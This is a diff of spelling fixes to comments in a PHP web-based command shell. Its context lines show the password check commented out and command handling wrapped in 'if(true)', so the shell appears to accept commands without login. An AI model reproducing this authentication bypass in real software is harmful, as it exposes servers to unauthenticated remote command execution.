@@ -47,7 +47,7 @@ include 'ipcheck.php';
 /* This error handler will turn all notices, warnings, and errors into fatal
  * errors, unless they have been suppressed with the @-operator. */
 function wpl_error_handler($errno, $errstr, $errfile, $errline, $errcontext) {
-    /* The @-opertor (used with chdir() below) temporarely makes
+    /* The @-operator (used with chdir() below) temporarily makes
      * error_reporting() return zero, and we don't want to die in that case.
      * We do note the error in the output, though. */
     if (error_reporting() == 0) {
@@ -126,7 +126,7 @@ if (isset($_POST['logout']))
 //if (isset($_SESSION['nounce']) && $nounce == $_SESSION['nounce'] && 
 //    isset($ini['users'][$username])) {
 //    if (strchr($ini['users'][$username], ':') === false) {
-//        // No seperator found, assume this is a password in clear text.
+//        // No separator found, assume this is a password in clear text.
 //        $_SESSION['authenticated'] = ($ini['users'][$username] == $password);
 //    } else {
 //        list($fkt, $salt, $hash) = explode(':', $ini['users'][$username]);
@@ -161,7 +161,7 @@ if(true) {
         
         array_unshift($_SESSION['history'], $command);
   
-        /* Now append the commmand to the output. */
+        /* Now append the command to the output. */
         $_SESSION['output'] .= '$ ' . $command . "\n";
 
         /* Initialize the current working directory. */
@@ -211,7 +211,7 @@ if(true) {
 
             // We canot use putenv() in safe mode.
             if (!ini_get('safe_mode')) {
-                // Advice programs (ls for example) of the terminal size.
+                // Advise programs (ls for example) of the terminal size.
                 putenv('ROWS=' . $rows);
                 putenv('COLUMNS=' . $columns);
             }
@@ -310,7 +310,7 @@ if(true) {
 
 <?php
 if (false) {
-    /* Genereate a new nounce every time we preent the login page.  This binds
+    /* Generate a new nounce every time we present the login page.  This binds
      * each login to a unique hit on the server and prevents the simple replay
      * attack where one uses the back button in the browser to replay the POST
      * data from a login. */
